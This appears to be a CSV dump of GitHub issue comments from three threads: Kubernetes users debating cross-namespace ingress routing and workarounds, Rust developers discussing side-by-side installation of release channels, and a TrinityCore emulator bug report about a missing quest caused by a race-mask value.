kubernetes/kubernetes/17088/274570596,17088,"You're both still missing the point, you can use a single ingress controller for as many namespaces full of ingresses you want ",,False
kubernetes/kubernetes/17088/274755613,17088,"@friend Yes, I did understand that this is possible. What I am missing is how you do that? Does the controller receive events for ingress resource in every namespace, no matter in which namespace the controller resides in? ",,False
kubernetes/kubernetes/17088/274987198,17088,"And I was not understanding that when I weighed in on this way back when. Given my current understanding, I actually have come around to believing there's no issue or truly damning limitation here. ",,False
kubernetes/kubernetes/17088/276326628,17088,"@friend I believe I am the same as @friend in that I do not understand how to achieve my goal. Please let me explain. I am trying to implement the blue/green deployment pattern using ""blue"" and ""green"" as my namespaces - each namespace hosts my application stack at different versions. My desire is to have a single Ingress resource routing traffic for  to, e.g. the blue namespace, and then at the point of release, make a change to that Ingress so that now traffic is being routed to my green namespace (without the public IP of that Ingress changing). Unfortunately I believe all the solutions mentioned above require interaction with some entity outside of Kubernetes, e.g. an external load balancer, which is not desirable. If it helps, I'm on Google Container Engine. I hope now that we are on the same page? My problem is that if I believe that without a service namespace selector, I can't achieve what I want to achieve. ",,False
kubernetes/kubernetes/17088/276405816,17088,"@friend nope, still doable without a namespace selector. Remember that an ingress controller does not change ip between different ingress resources. It just combines them together and serves them. Try running the nginx controller for example, and setting up what you want. You can either use a different URL in one namespace, and then change it to the main URL when you want to enable that namespace (kubectl edit it) or you can write a little bash script that deletes the ingress object in one namespace and immediately recreates it in the other. The main thing I think you're missing is that the ingress objects are just data. Deleting them doesn't actually cause kubernetes to delete any resources. The ingress controller however is watching for changes to these resources and uses them to update its configuration. For the nginx controller this means updating the nginx.conf which does not change anything about how you chose to route traffic to the nginx pods. The IP remains the same. ",,False
kubernetes/kubernetes/17088/276406373,17088,"@friend yes. It depends on their implementation, but most of the controllers monitor all the namespaces on default (which is changeable) ",,False
kubernetes/kubernetes/17088/276683352,17088,"@friend thanks for your help, however I believe that it is not possible to change the namespace of an ingress object using  In this operation I attempted to change the namespace of the Ingress resource to , where it was previously . Additionally if I delete this (my only) Ingress resource, I lose the IP address which Google Cloud load balancing has provisioned for me. Perhaps this behaviour would change if I had another Ingress resource. ",,False
kubernetes/kubernetes/17088/277889816,17088,"one thing i don't seem to be able to understand is why insist on ingresses not being able to use services from other namespace, when there aren't any security measures in place (as far as i know) to prevent any pod from just using the  fqnd to get data from another namespace.  or is the fact, that this is possible a security flaw, that will be fixed in future versions? update this is what i mean ",,False
kubernetes/kubernetes/17088/277891333,17088,@friend I believe the intent is that cross namespace service access will not be allowed in the future. ,,False
kubernetes/kubernetes/17088/277892880,17088,"put then the question still stands why not have a certain kind of flag or even  to allow cross-namespace access to certain pods or have a service definition which namespaces they can be accessed from. without this there would be a nn (namespaceingress-host) relation between namespace and hosts that expose them, while it would be nicer to have a n1 relation to cut down on costs for additional public facing static-ip hosts. ",,False
kubernetes/kubernetes/17088/278138993,17088,"@friend I'm not familiar with how the Google Cloud router works with Ingress right now. However. If you use the nginx ingress controller and point a LoadBalancer at the ingress controller you will get what you want - a single stable IP address TCP load balancer created by the Service pointing to a horizontally scaleable nginx layer. Moving Ingress objects between namespaces just updates the Nginx configuration, and does not release any IP addresses. It'll also give you more direct control over how the router works, and might save money on Google Cloud resources. The Google Cloud implementation SHOULD keep a single IP address and make HTTP rules in that balancer to point to however many Ingress objects exist in the cluster - that might not be the case right now. ",,False
kubernetes/kubernetes/17088/278300374,17088,"@friend thanks for the suggestion, I haven't tested it, however I am leaning towards a similar solution for my specific requirement by using a LoadBalancer as you suggest to point to my own nginx-based router's service. This approach uncovered a bug in , see #40870. I'm afraid that I have currently put this issue down while I am working on other priorities, but I will be able to return to this problem and conduct some conclusive tests of this suggestion and other suggestions in this thread. I apologise that I don't have time to do this right now. I also think that, so far, efforts in achieving my goal should be documented in a new thread entitled ""Support blue/green deployments"", as this issue is very clearly ""support cross-namespace ingress"" and the answer seems to be a firm ""no, we won't"". ",,False
kubernetes/kubernetes/17088/278301972,17088,"@friend in my instance, my frontend app connects to its component services using DNS as service discovery. They connect to a static name, e.g.  or . By deploying different versions in different namespaces, we get 100% satisfactory service discovery. We are unwilling to implement a different method of service discovery for the following reasons  More complexity brings more opportunity for failure. More per-deployment environmental configurations brings more opportunity for failure through less deployment parity. Our local dev setup is using pure Docker networking which is compatible with this DNS-based approach (which is a design feature of , I believe).  We are very satisfied with this approach in every way, with the exception that cross-namespace load balancing (switching) is impossible with pure-k8s at the moment. ",,False
kubernetes/kubernetes/17088/278302853,17088,"@friend at some point between you making this comment and today, this functionality regressed. See #40870. I would appreciate it if you could accelerate @friend's request for a second opinion on that thread please! ",,False
kubernetes/kubernetes/17088/278368093,17088,"If you need a huge design change in something like Kubernetes to do a relatively common deployment pattern, you're doing it wrong. I rest my case, but urge you to rethink your approach. Reread the docs on how DNS and pod ips work, particularly around multiple / cross namespace communication. Namespaces are used usually in a one namespace per deployment fashion - one for prod, dev, etc although the isolation they provide can be used for other things too. ",,False
kubernetes/kubernetes/17088/278374265,17088,"@friend please re-read my response to your suggestions. You suggested using a LoadBalancer service to direct traffic to the correct endpoint. I have tried this and this functionality does not work as described in the documentation. I tried your suggestion of multiple Ingress resources, and that didn't work. I also took inspiration from this, and tried having multiple Ingress resources in different namespaces, and changing which HTTP host they were configured for. This also didn't work - traffic was never re-routed, and I could confirm that the underlying Google Cloud routing rules had not been updated. I apologise for not reporting this, however at that point I had already given up on using Ingress for my solution - I understand and accept that this is not what it's for. I have merely been replying to your suggestions. That is why I intend to open a new issue, as I have not yet seen any workable solutions that function as advertised. I'm not sure why you have now taken this hostile attitude, but I am disappointed that you seem to think I am stubbornly ignoring your help. Trust me, I am VERY eager to solve this problem. Thank you for continuing to help me, but please could I ask that if you think you have suggested workable solution, could you re-iterate it so there is less confusion between what you think works, and what I think works? ",,False
kubernetes/kubernetes/17088/278382428,17088,"You've still not read and understood my suggestion, which means at this point you're probably skipping reading anything I'm posting at all. Remember that I'm the one that made this issue in the first place, and yes, I was in the exact same position with the exact same deployment model as you. I suggested using a Nginx Ingress Controller from the official kubernetes ingress controller implementations, and directing a load balancer at that ingress controller to get a stable IP. From what you've said above it seems you misunderstood. This is exactly what ingress is for, so don't give up yet. ",,False
kubernetes/kubernetes/17088/278406079,17088,"OK, I think I understand your suggestion, but let me play that back to you  Create an nginx Ingress Controller so that we have something we can route to. Create a LoadBalancer service and include the Ingress Controller in its selector. OK great, now we have a single IP, all Ingress resources are served under this IP. Create an Ingress resource under some given namespace, and specify our app's HTTP endpoint service as the backend. We're now serving our live app.  All good so far.  Now, we want to serve the new release. What happens? Delete the Ingress resource in the previous namespace, and create the same Ingress resource in the new namespace? OK... that will cause a service interruption, but maybe I can live with that.  Now we're serving the newest release with a small loss of service.  Next up, we want to test the development release (as per the blue/green pattern). It's deployed to a new namespace. Problem - how do I route traffic to it? Any Ingress resource can only use the single LoadBalancer IP I first created, so I can't differentiate the traffic as I can't add another IP. Unless... I use the hostname-based routing functionality of Ingress? I guess we can additionally configure static DNS names, but it's extra complexity.  If this is what you're suggesting, then I'm not really inclined to proceed with Ingress, and would rather pursue the service-to-service approach as described in the documentation and suggested by thockin. However, I can see that it would just about fit our use-case, so thank you. ",,False
kubernetes/kubernetes/17088/278437624,17088,"Ingress is designed to do http level routing of traffic while services do TCP level routing. For your use case I would use a subdomain to route to the dev environment for sure. Usually people don't switch entire namespaces to do deployments, so kubernetes isn't designed towards that model as heavily. However, I can understand why you're doing it, and I definitely think you'll do fine with this approach. You shouldn't see a service interruption by the way if you do it with a script that swaps them around immediately. The nginx config should be updated immediately and nginx doesn't have to restart to apply the change and start rerouting traffic. ",,False
kubernetes/kubernetes/17088/279699396,17088,"@friend I think the main confusion here is due to how Google Container Engine behaves. My first expectation on how Ingress should work was exactly what you described Simply have multiple  resources and the ingress controller will make all of them available on the same node port / IP address to the outside world, right? But then I tested this And this is what I got on Google Container Engine  You can see that there are two public IP addresses now, one for each ingress. So I thought Apparently my mental model on how ingresses are supposed to work is wrong, let's look some more at the documentation  Ah! The documentation suggests to use a single ingress if you want to have a single IP address. All right, seems to work in a single namespace, let's try to add services from other namespaces...  What? Now what am I supposed to do? And that's how I ended up at this issue. I hope that this shows why the model of ingresses that you describe (and which I would prefer) is not what we get by default on GKE. Maybe we are supposed to not use the default ingress controller created by GKE, but that really is not obvious. How can we improve this situation? ",,False
kubernetes/kubernetes/17088/279713442,17088,"@friend you're right, the GCE controller behaves differently than one might expect, and from how I think it's supposed to work, at least from how the developers explain it in this thread. Maybe open another issue? This one is too far gone I think. ",,False
kubernetes/kubernetes/17088/279733788,17088,"@friend, I had the same confusion initially. Container Engine's ""L7"" ingress controller isn't implemented using the familiar model that others have described here. It actually provisions an HTTP/S load balancer per ingress. Besides not being what you want, that could also be costly. fwiw, I highly recommend dumping that ingress controller. I think you can just uninstall it, but a more resilient option could be to annotate your ingress resources in a way that will make that ingress controller ignore them. Then you're free to install some other ingress controller and let it handle things differently than Google's does. I prefer Traefik, personally, so I use the following annotation My understanding is that the Container Engine ingress controller will ignore any ingress annotated with  != . Hope that helps. ",,False
kubernetes/kubernetes/17088/279761468,17088,"I have tried Nginx now and it works fine. I'll also take a look at Traefik. So you and me have figured it out, but others will probably run into it again and again. Google Container Engine is one of the easiest ways to try/use Kubernetes and obviously people try the preinstalled ingress controller first. How can we bring this up with the right people? The Kubernetes project is not directly responsible for GKE, right? ",,False
kubernetes/kubernetes/17088/279772526,17088,It is. GLBC is written by the same devs in the same repos ,,False
kubernetes/kubernetes/17088/279779252,17088,I filed  that seems like the right place. ,,False
kubernetes/kubernetes/17088/306719946,17088,"My use case is  jenkins, grafana, etc. in different namespaces I want a single ELB with Ingress per namespace  so the question is, will it work right now? if not, why? ",,False
kubernetes/kubernetes/17088/307840482,17088,"Sorry if this is wrong discussion, just want to describe my case. I have some developer teams working on one complex product. Product is splitted to semi-independent parts, each of particular parts is developed by its own team and namespaced respectively. Everything was great before marketing team demand us to change components addressing from  to . So for now we still have namespaces with own ingresses for every component, but it's absolutely impossible to build ingress resource for ""main"" part, because of structure like this is invalid spec   rules   - host domain.com     http       paths       - component1           namespace component1           serviceName component1           servicePort 80         path /component1       - component2           namespace component2           serviceName component2           servicePort 80         path /component2       - ...  Any chances to use ingress resources in this case, or I need to build homebrewed NGINX configuration to achieve this requirement? Thanks in advance! ",,False
kubernetes/kubernetes/17088/307849868,17088,@friend what ingress controller are you using? If is the nginx ingress controller then you just need to split de definition of the ingress (to be able to reference services from different namespaces) Like and the controller will merge the paths under the same nginx server ,,False
kubernetes/kubernetes/17088/307860778,17088,"This is what people fail to understand... An ingress controller can read in multiple Ingress objects and build a single config to direct traffic, it's not 1 ingress &lt;-&gt; 1 controller... ",,False
kubernetes/kubernetes/17088/307866998,17088,With the default GKE ingress controller it is 1 ingress &lt;-&gt; 1 domain or IP addy. ,,False
kubernetes/kubernetes/17088/307878434,17088,"@friend oh, looks like I got it at last! Thank you, will try it in the morning. ",,False
kubernetes/kubernetes/17088/307878917,17088,@friend I'm still interested Which ingress controller were you using? ,,False
kubernetes/kubernetes/17088/308077354,17088,@friend NGINX by kubernetes team ,,False
kubernetes/kubernetes/17088/313191717,17088,"Probably out of context, but how does the Nginx controller by kubernetes differ with the one provided by nginx? And which one is preferred and why? I was trying the approach suggested by @friend on nginx plus controller by nginx but it does not seem to work. ",,False
kubernetes/kubernetes/17088/314713077,17088,"For scenario “Bregor commented on Jun 13”, the solution from ""aledbf commented on Jun 13"", not work . Here is example in AWS Per solution, each namespace must generate one ELB (load balance) However, in AWS route 53, one domain www.abc.com can only point to single ELB (load balance). So, you cannot combine all namespace api into one domain www.abc.com You have to divide api into different sub-domain by namespace. namespace1.abc.com namesapce2.abc.com namespace3.abc.com ",,False
kubernetes/kubernetes/17088/314749934,17088,"@friend The issue is about cross-namespace rule definitions in ingress. You seems to have conceptual problem on AWS, even before the traffic goes to k8s cluster. If you choose single domain you are stick to single ELB. If you are using subdomains, you are free to choose - single/multiple ELB. You have to choose. PS. To generate many ELB create multiple kubernetes services (type LoadBalancer) with identical selector pointing to same ingress-controller. ",,False
kubernetes/kubernetes/17088/315026293,17088,"I can confirm that we made work cross namespace on GKE 1.6.4 and traefik. The trick was to use the current (2017-07-13) stable helm. Then, every namespace can have its ingress (referencing its own services) and the main controller aggregates the routes. Just awesome. ",,False
kubernetes/kubernetes/17088/315037519,17088,This is exactly the same as currently nginx controller works. The issue is to enable in single namespace reference to services in other namespace. Such feature is implemented in voyager ingress controller  apiVersion voyager.appscode.com/v1beta1 kind Ingress metadata   name test-ingress   namespace foo spec   rules   - host foo.bar.com     http       paths       - backend           serviceName s1.bar # serviceName.Namespace           servicePort '80'  ,,False
kubernetes/kubernetes/17088/359160378,17088,When you create an ingress you intentionally think it is build around a loadbalancer or controller. That leads to the thinking that there can be just one. And you would expect to add namespace here If documentation would emphasize that ingress is build around namespaces it would make it obvious that there can and must be many. ,,False
kubernetes/kubernetes/17088/375695402,17088,"I started using GKE, after years of using home grown clusters with the nginx ingress, and was surprised by the IP per Ingress behaviour of the default ingress controller. I thought I could get around this by using a single ingress file in the kube-system namespace that aggregated all host/paths -&gt; service rules but it turns out I cannot reference services in other namespaces. Is there a better option other than dumping the default controller for the nginx controller or manually creating endpoints for a service without selectors? ",,False
kubernetes/kubernetes/17088/375785460,17088,"I think nobody is AGAINST a broader solution, but there are conflict-resolution rules that need to be decided and access control issues to work out.  I'd live to see a proposal. On Fri, Mar 23, 2018 at 806 AM André Cruz notifications@friend.com wrote ",,False
kubernetes/kubernetes/17088/393131724,17088,"My situation is the following Using kops in AWS. I have staging application deployment which lives in default namespace  and production deployment which lives in production namespace. Application consists of two services, one service should be exposed publicly and the other service should be private (i.e. use internal load balancer) There are 2 nginx ingress deployed, one per namespace. Ingress in default namespace is exposed with internal LB and Ingress in production NS is exposed with public LB. I decided that staging services should be exposed via internal load balancer and live in default namespace. When it comes to production main service should use public load balancer and the second service should use internal load balancer. So here comes the problem, that it would be nice that ingress controller in default namespace could access the service(exposed internally) in production namespace... I ended up with the solution  production service that needs to be accessed internally is deployed in default NS alongside with staging deployment. That service is connected to the database that lives in production NS with full DNS name.. I believe that architecture is not perfect and confusing. Being able to access services in different namespaces I could deploy all production services into production NS ",,False
kubernetes/kubernetes/17088/394313647,17088,my workaround  serviceA in namespaceA create serviceB in namespaceB  add ingress rule into ingressB in namespaceB   ,,False
kubernetes/kubernetes/17088/396527254,17088,I first came across this issue a few months ago and after reading it too quickly I was still confused. After a recent second read I realised that my requirement was actually really easy to achieve with the NGINX Ingress Controller. I've written this up as an article on Medium. I hope someone else finds it useful. ,,False
kubernetes/kubernetes/17088/396612130,17088,"cesartl, Came to same solution by myself, but it is not working. Ingress installed via helm to kube-system namespace with ""rbac create"" option. ",,False
kubernetes/kubernetes/17088/396895911,17088,"hi @friend, I've installed the Ingress Controller manually and it works well. I've actually updated the article above to show how to use Ambassador, perhaps this is a better solution for you? ",,False
kubernetes/kubernetes/17088/397726856,17088,"Hi, @friend  Thanks for awesome job. Anyway, I finally made it, but outside of rancher. ",,False
kubernetes/kubernetes/17088/399061736,17088,"For Google Kubernetes Engine (GKE) specifically, I have written a step by step guide here for setting up nginx ingress controller to route traffic across cross namespace ingress resources  @friend for your post, it was very helpful in getting somethings off ground for me. ",,False
kubernetes/kubernetes/17088/402745731,17088,"Hi @friend , Thanks a lot for your post, it actually helps a lot ! But I'm still stuck on the last step  I tried a sample use-case with a quick nginx deployment as a test web server (yeah using a proxy as a test server is a little weird, ;)), and I'm trying to contact this server using the ""Ambassador"" option. =&gt; when I use kube-ctl port-forward on the nginx pod, I can display the test page without issue. =&gt; when I use the ELB built by ambassador, I get a ""no healthy upstream"" error. In a way, it means that the ambassador annotations are correctly detected and ambassador is trying to do something, but it just doesn't work (I think this error is coming from the envoy proxy, but this is where we reach my limits on the subject ;)) Would you have any idea of the possible root cause / how to debug this ? Ambassador config  exactly a copy-paste of the tutorial, except that  I created everything in the ""ambassador"" namespace I have ""use-proxy-proto"" to ""true"" instead of ""lower"" (I think it was a typo)  Test nginx deployment (note  I deployed nginx in the ""default"" namespace)  Test nginx service Thanks ! ",,False
kubernetes/kubernetes/17088/402987834,17088,"Hi @friend, I don't think this issue is the best place to discuss that. You can always discuss with the Ambassador team or their Gitter or the new slack here I'm not an Ambassador expert but I can try to help you there. ",,False
kubernetes/kubernetes/17088/420162527,17088,"What's the argument against referencing a service in another namespace in an ingress? With workarounds like  it would seem whatever supposed security benefits are nonexistent. With the ingress-nginx controller, the ability to inject arbitrary nginx config via nginx.ingress.kubernetes.io/server-snippet means I can essentially emulate cross-namespace service references, but in a janky and error-prone manner. So why not relax this restriction, and let us do what we are already able to do via workarounds, and let us do it cleanly. ",,False
kubernetes/kubernetes/17088/420178054,17088,"The recommendation of @friend to split the ingress from the service worked for us but because we also use cert-manager and an OAuth proxy, having two different ingress objects in two different namespaces caused cert-manager to generate the SSL cert with Let's Encrypt twice.  It would've been better to be able to reference the OAuth proxy in the other namespace to avoid procuring the cert twice. ",,False
kubernetes/kubernetes/17088/420374817,17088,@friend We have a similar use case where we use an oauth2 proxy and we really don't want to run one in every namespace. ,,False
kubernetes/kubernetes/17088/456590082,17088,"I'm sorry to resurrect a dead thread, but we definitely need this. Our reasoning is this. Let's say we have n number of api's. As n grows we want to create some apis that should be cross cutting in that all teams use them, but managed by one team. It is impossible to manage x number of cross cutting apps in every namespace. So we need to have this cross cutting api in its own namespace for security/managibility reasons. The biggest being since we are now proxying to a new namespace, we can request a new audience for our token, and not bloating the original token. Ingress is by definition a reverse proxy. So it should be easy enough to set ",,False
kubernetes/kubernetes/17088/456598371,17088,@friend This seems like something that could be better solved by a service mesh like istio? ,,False
kubernetes/kubernetes/17088/474737592,17088,"I tried,but i got error like this ♠Error resolving host ""serviceB.namespaceB.svc.cluster.local"" lookupserviceB.namespaceB.svc.cluster.local on 114.114.114.11453 no such host` It seems like ingress controller using public dns to resolve this hostname. And k8s doc says  ""ExternalNames that resemble IPv4 addresses are not resolved by CoreDNS or ingress-nginx because ExternalName is intended to specify a canonical DNS name. "" ",,False
kubernetes/kubernetes/17088/474756610,17088,My solution Target using ingress in namespaceB to access serviceA in namespaceA Solution create endpoint in namespaceB point to the clusterIP of serviceA like this ,,False
kubernetes/kubernetes/17088/475088747,17088,My solution ,,False
kubernetes/kubernetes/17088/477229061,17088,"This solution is not working in GKE. It only allows me to use LoadBalancer or NodePort when I'm trying to reference my service with type as externalName. My workaround was to go a bit lower and fire up an nginx pod in namespace A and point that to my service in namespace B, so I can use my nginx pod's service for the ingress in namespace A. ",,False
kubernetes/kubernetes/17088/482223813,17088,Worked for me. Thanks ,,False
kubernetes/kubernetes/17088/495034468,17088,"How? GKE does not allow ExternalName and asks for NodePort or LoadBalancer. Any news on that issue? The workarounds do not work for me, since I consider using GCLB (anycast) for multi cluster. Thanks ",,False
kubernetes/kubernetes/17088/498175305,17088,"The ExternalName approach doesn't work on GKE as canmanmake pointed out, here is the error message for people googling this issue. ",,False
rust/rust-lang/19263/49867490,19263,"Rust is going to have three release channels stable, beta, and nightly. Each of them has its use (that’s why they exist), so it will probably be common to have more than one of them installed at the same time on the same machine (such as a developer’s laptop). Currently, this it is possible to install multiple rusts at different locations, and set up the  and (since the [rpath removal])  environment variables to pick one of them. However this is error-prone and not very convenient. It would be better if multiple versions could be installed in the same ""prefix"" (e.g. , where the default environment variables Just Work&lt;sup&gt;®&lt;/sup&gt;). Executables could have a suffix to distinguish them, for example  (stable),  and . Other files would have to be namespaced somehow to avoid conflicts. (Corresponding Cargo issue ",,False
rust/rust-lang/19263/64188991,19263,"Semi-related I have been wondering whether we should start distributing a wrapper script for invoking  that sets up the  and other environment variables appropriately. I saw a user recently who untarred the  binary package and tried to copy  into a different location.  I advised them to ""just install it globally"", but I would prefer to have some support for the use case where you do not install the distribution into .  I have been maintaining my own private script for supporting this, but it would probably be good to determine what our general attitude is about this.  (That is, if the team thinks we can stomach supporting a wrapper script, then I can work on making my own script more robust and making it distributable.  If the team hates the idea of a wrapper script ... well, then that's unfortunate given that we've also discarded using rpaths...)  Update Oh, the reason that this is related to this topic is that a wrapper script can be written to support multiple release channels, either by having multiple scripts that point to the different spots as necessary, or by having a single script that reflectively dispatches on , i.e. guessing based on whether we see  or  in the script's name. ",,False
rust/rust-lang/19263/64192398,19263,"There is endless precedence for this kind of tooling in the Ruby/Python worlds, and it's quite useful. ",,False
rust/rust-lang/19263/64192730,19263,"@friend, right. At some point we might also want to do this by version numbers (e.g. have Rust 1.3 next to 1.4) in addition to release channels. ",,False
rust/rust-lang/19263/64284909,19263,The obvious problem with putting a bunch of same-named libraries next to each other is that they are going to cause resolution conflicts. We might resolve that by attaching a unique id to each build of the compiler and associating every library with that build. That will have some impact on distributing binary libs (which presumably nobody does currently). The docs are also going to cause naming conflicts as well as some of the other supplementary files. Have to consider all the different ways of installing Rust and whether and how to make them all compatible with multi-rust. ,,False
rust/rust-lang/19263/64285417,19263,"Note that our makefiles specify a 'extra filename' paramter to be mixed into all filenames  could tweak that per-release channel in theory. The binaries themselves won't have it mixed in, though (just the libs). ",,False
rust/rust-lang/19263/64395752,19263,"I agree with @friend .  It should suffice to extract as many TAR archives as the user wish under the common ""base"" directory in a parallel manner.  They can coexist and uninstalling one of them is as simple as . *nix We can simply provide a wrapper shell script to choose one of multiple installations We can enhance this wrapper following battle-tested tools such as  (Ruby),  (Python), or  (Node.js)  (Several similar tools exist for each language;  I'm not claiming they are the best ones for their languages.) To those who likes nitpicking not setting  properly is caller's fault. Windows The idea is the same as the *nix case.  Instead of , we can implement a wrapper executable which calls  to locate the base directory  ",,False
rust/rust-lang/19263/64407819,19263,"@friend another option for Windows is a wrapper  script.  You can use the variable  which expands () into the drive () and path () for the batch file ().  See also  do not do much Windows hacking; I just remembered that we used a trick like this in the Larceny project larceny.bat, and I think a batch file will be easier for end-users to modify/maintain than a wrapper executable.) ",,False
rust/rust-lang/19263/64408743,19263,"It’s maybe not as essential that all of the ways to install support this, as long as some of them do. In particular, the packages for Rust release and nightly in my distribution currently conflict, and I’d like them not to ) IMO it’s ok if packagers need to do a small amount of work (like passing the right  flags) to make this happen. ",,False
rust/rust-lang/19263/68322110,19263,I have a project that supports installation of multiple Rusts  It depends a bit on the upcoming release channel and installer infrastructure. ,,False
rust/rust-lang/19263/74616255,19263,"Hello, I am a co-maintainer of rust on Gentoo. Are there any updates on this issue? What is the appropriate way to install multiple release channels? Thanks much, William ",,False
rust/rust-lang/19263/74616834,19263,"I believe the compiler itself can add support for things (though I’m not sure what exactly) to make this easier. In the meantime Brian has been working on  , which I believe is the best we can do right now. You probably don’t want to import it as-is into the Gentoo packaging system, but you could take ideas. Specifically, it ""installs"" different Rust versions in different directories. (It just extracts tarballs with pre-built binaries, but I believe it’s equivalent to building with .) Then, wrapper scripts run executables from one install or another after setting up the environment, most importantly the  variable. ",,False
rust/rust-lang/19263/93385609,19263,Triage multirust has matured significantly. ,,False
rust/rust-lang/19263/106747812,19263,"Here's one unfortunate case where multirust doesn't help, and other than bringing back rtool I'm not sure what will. It seems like it should be a non-negotiable requirement that one can run a program after building it without having to invoke any black magic between build and run. ",,False
rust/rust-lang/19263/122322809,19263,"@friend Just to mention it, Gentoo deals with multiple rust installations already and names them e.g.  and manages a symlink using . So there is the overlay called rust (obviously) which contains the special versions rust-9999 (git) and rust-999 (nightly). Would it be possible to have rust (binary named *-stable), rust-beta and rust-nightly in this repo? Then I could manage my versions (which are updated as expected by the package manager) using eselect for the default compiler and still use rustc-beta and rustc-nightly or rustc-9999 for the other versions. This way I could test libraries much more easily for stable/beta/nightly compatibility. Edit Sorry, I did not see before that the portage (non-overlay) is also ruststable and the rust-999 of the overlay is rustnightly. Still, the beta is missing. ",,False
rust/rust-lang/19263/130843650,19263,"I believe multirust is basically our answer here, so closing, yay! ",,False
rust/rust-lang/19263/130845664,19263,Now if only we had a Windows equivalent! ,,False
TrinityCore/TrinityCore/11476/25898610,11476,Magistrix Landra Dawnstrider is missing the quest 9395 (Saltheril's Haven) WoWHead.com info say     Level 9     Requires level 8     Side Horde     Start Magistrix Landra Dawnstrider     End Lord Saltheril     Sharable     Difficulty 8  12  15     Added in patch 4.0.1 &lt; This is incorrect as it was added way before 4.0.1 I know because I played official since Vanilla and I made many Blood Elves even in WotLK 3.3.5. using Zygor Quest Guide takes you to her to accept quest but quest is not in log. Zygor Quest Guide follows the Vanilla Questing to a tee and I made sure I had the 3.3.5 Version of the quests guides so no mishaps like this happen Series  Saltheril's Haven The Party Never Ends  Checking in the Database (creature_queststarter) page 4 the quest id 9395 is linked with the correct quest entity 16210 (Magistrix Landra Dawnstrider) so why would the quest not populate and show up in-game? Level requirements were met faction requirements also met and the pre-quest 9255 (Research Notes) was completed which should make quest 9395 Available immediately. manually adding the quest does properly accept the quest. .quest add 9395 ,,False
TrinityCore/TrinityCore/11476/32737596,11476,"It may be in the disables table, if a manual add isn't working for it. ",,False
TrinityCore/TrinityCore/11476/32738245,11476,no manually adding it does work which is what confuses me on why it's not available when the appropriate requirements are met ,,False
TrinityCore/TrinityCore/11476/32738504,11476,"Ok. Then it's simply not in creature_queststarter table. With the manual add, can it be properly handed-in? If not, then you need to add the appropriate creature_questender table entry, too. ",,False
TrinityCore/TrinityCore/11476/32739022,11476,"it is in that table ""Checking in the Database (creature_queststarter) page 4 the quest id 9395 is linked with the correct quest entity 16210 (Magistrix Landra Dawnstrider) "" and yes it can be handed in correctly which is why I'm baffled by this. and prequest 9255 is properly linked in both tables ",,False
TrinityCore/TrinityCore/11476/32739254,11476,Check the quest_template table and verify the RequiredRaces column. ,,False
TrinityCore/TrinityCore/11476/32739317,11476,says 650 is that correct I forget where to check that it's available to all HORDE not just bloodelves. ,,False
TrinityCore/TrinityCore/11476/32739321,11476,Look for wrong conditions. ,,False
TrinityCore/TrinityCore/11476/32739346,11476,untaught how do i do that? ,,False
TrinityCore/TrinityCore/11476/32739389,11476,  Have no time right now but when I get back I'll look at the issue. ,,False
TrinityCore/TrinityCore/11476/32739401,11476,650 is wrong. It should be 690 for WotLK or before and 946 for Cata and later (added goblin in Cata). ,,False
TrinityCore/TrinityCore/11476/32739476,11476,"OK thanks untaught, i'll check that section now Kylroi and post if that fixes it ",,False
TrinityCore/TrinityCore/11476/32739513,11476,No conditions for that quest. It must be the RequiredRaces column set wrong. ,,False
TrinityCore/TrinityCore/11476/32739519,11476,yes the required race is 690 I guess I miss read it when I thought ,,False
TrinityCore/TrinityCore/11476/32739544,11476,"9067    2   9   7   0   3430    0   0   0   0   690 0   0   0   0   0   0   0   0   0   0   9395    0   0   0   5   900 480 0   0   0   0   0   0   0   0   0   136 0   0   0   0   0   23500   0   0   0   1   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   911 0   0   0   0   5   0   0   0   0   0   0   0   0   0   0   0   0   0   The Party Never Ends    Acquire a bottle of Suntouched Special Reserve, Springpaw Appetizers and a Bundle of Fireworks, and return them to Lord Saltheril at Saltheril's Haven in Eversong Woods.   I like to throw parties... just a little something to celebrate the magnificence that is Quel'Thalas!$B$BBut, I'm in a bit of a bind.  I need you to gather up more party supplies.$B$BFrom Vinemaster Suntouched at the Silvermoon City inn, bring me a bottle of Suntouched Special Reserve.  From Zalene Firstlight at Farstrider Retreat acquire more of those delicious Springpaw Appetizers.  And you can pick up my delivery of fireworks from Halis Dawnstrider at Fairbreeze Village.$B$BBe quick about it!        You're quite the energetic young $gmanwoman;, aren't you?$B$BThis all looks very adequate. You certainly deserve compensation for gathering up all of this for me, and something a little extra I think.$B$BOh, I almost forgot, here's an invitation to the party. And, $c, next time that you drop in make sure to dress up in something a little more... festive.   Didn't I just send you out to gather up more party supplies?  Was that you?  Oh, I can't be expected to remember everyone's face, now can I?  I meet so many... interesting people.$B$BWhat is it that you want?    Return to Lord Saltheril at Saltheril's Haven in Eversong Woods.    0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   22775   22776   22777   0   0   0   1   1   1   0   0   0   1                   0   0   0   0   0   0   0   0   0   1   0   0   0   0   0   0   0   0   12340 ",,False
TrinityCore/TrinityCore/11476/32739558,11476,that's a big mess ugh lol ,,False
TrinityCore/TrinityCore/11476/32739628,11476,"Indeed. Is that the quest_template? If so, they really changed that structure between 3.3.5a and 4.3.4. ",,False
TrinityCore/TrinityCore/11476/32739685,11476,Here's the 4.3.4 listing ,,False
TrinityCore/TrinityCore/11476/32739701,11476,yes that's the quest template for the issue quest ,,False
TrinityCore/TrinityCore/11476/32739842,11476,"So, 9067 lists 9395 as the next quest, and 9395 lists 9067 as the previous quest. However, the core doesn't give you 9395 when you complete 9067? ",,False
TrinityCore/TrinityCore/11476/32739961,11476,exactly and the level requirement is level 8 min and I was level 10 and still was not available... it's a odd bug probably something very minute could even be on my end but for the love I just cannot figure it out. ,,False
TrinityCore/TrinityCore/11476/32740160,11476,"Well, yes, it's your end. You're using WoW emulation instead of a retail server. heh Seriously, though, it's sounding like a bug that was introduced in some of the code changes that have been going on. All I know it that when they try to merge some of those master branch changes, they royally mess up the 4.3.4 branch (current commit revision won't even compile all the way due to an incomplete merge, but that will likely be fixed in a day or so). ",,False
TrinityCore/TrinityCore/11476/32740291,11476,Could you post the SQL export of the 2 quests (similar to the way I posted the 4.3.4 version)? Which SQL client do you use? ,,False
